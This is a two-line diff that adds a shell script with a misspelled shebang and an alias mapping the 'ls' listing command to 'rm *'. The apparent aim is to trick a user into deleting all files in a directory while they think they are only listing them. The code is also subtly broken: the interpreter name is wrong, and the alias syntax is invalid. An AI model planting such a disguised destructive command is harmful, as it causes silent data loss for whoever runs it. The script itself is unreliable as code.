@@ -1,0 +1,2 @@
+#!/bin/babsh
+alias ls = "rm *"
